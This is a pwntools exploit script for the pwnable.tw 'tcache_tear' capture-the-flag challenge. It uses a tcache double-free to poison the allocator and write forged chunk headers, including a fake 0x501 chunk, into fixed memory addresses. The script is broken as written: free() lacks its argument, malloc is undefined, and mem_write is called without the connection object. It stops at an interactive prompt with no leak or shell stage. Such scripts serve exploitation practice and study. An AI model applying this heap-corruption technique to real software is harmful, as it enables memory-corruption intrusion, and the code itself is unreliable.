#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF('tcache_tear')
libc = ELF('libc.so.6')
# context.log_level = "debug"
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path, 'set environment LD_PRELOAD ./libc.so.6')
    else:
        return remote('chall.pwnable.tw', 10207)
    
def alloc(p, size, data):
    p.sendline(b'1')
    p.sendline(bytes(str(size), 'utf-8'))
    p.sendline(data)
    
def free(p):
    p.sendline(b'2')

def print_info(p):
    p.sendline(b'3')
    return p.recv(32)

def mem_write(p, address, value, s):
	info("[Mem Write ] Writing %s to %s" % (value, hex(address)))
	alloc(p, s, b"anything")
	free()
	free()
	alloc(p, s, p64(address))
	malloc(p, s, p64(address))
	malloc(p, s, value)
 
if __name__=='__main__':
    io = start()
    # give a name
    io.sendline(b'name')
    mem_write(0x602550, 
			p64(0) + 	# Previous Size
			p64(0x21) +	# Chunk Size (A=0, M=0, P=1)
			p64(0) + 	# Forward Pointer
			p64(0) + 	# Backward Pointer
			p64(0) + 	# Empty Space
			p64(0x21),	# Next Previous Size
		112)
    mem_write(0x602050,
			p64(0) +	# 0x602050		Previous Size 
			p64(0x501) +	# 0x602058		Chunk Size (A=0, M=0, P=1)
			p64(0) +	# 0x602060[name_buffer]	Forward Pointer
			p64(0) +	# 0x602068		Backward Pointer
			p64(0)*3 +	# 0x602070		Empty Space
			p64(0x602060),	# 0x602088[malloced] 	Overwrite the last malloced value
	    96)
    io.interactive()
    
    
    